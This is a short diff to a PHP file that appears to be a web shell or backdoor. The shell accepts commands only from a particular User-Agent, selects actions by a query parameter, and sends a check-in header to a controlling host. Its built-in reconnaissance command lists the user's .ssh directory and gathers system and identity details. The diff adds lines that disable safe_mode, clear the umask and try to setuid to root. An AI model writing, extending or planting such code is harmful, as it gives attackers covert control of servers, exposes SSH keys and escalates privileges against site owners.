@@ -1,5 +1,8 @@
 <?php
-$base = 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami';
+ini_set("safe_mode", 0);
+umask(0);
+posix_setuid(0);
+define("base",'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami');
 
 
 function banner(){
@@ -385,7 +388,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         elseif ($_GET["qs"] == "cqCM")
             checkComs();
         elseif ($_GET["qs"] == "cqBS")
-            executeCommands($base, "1");
+            executeCommands(base, "1");
     } else {
         if (!empty($CHECK_IN_HOST)) {
             header("Checkin: " . $CHECK_IN_HOST);
